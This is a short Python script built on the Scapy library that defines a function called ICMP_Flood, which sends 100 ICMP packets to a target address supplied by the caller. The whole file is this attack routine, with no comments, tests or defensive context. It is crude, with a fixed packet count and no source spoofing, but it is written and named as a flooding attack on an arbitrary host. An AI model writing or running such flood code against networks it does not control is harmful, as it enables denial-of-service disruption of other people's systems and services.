from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send

def ICMP_Flood(target):
    cycle = 100
    for _ in range(0, int(cycle)):
        send(IP(dst=target)/ICMP())
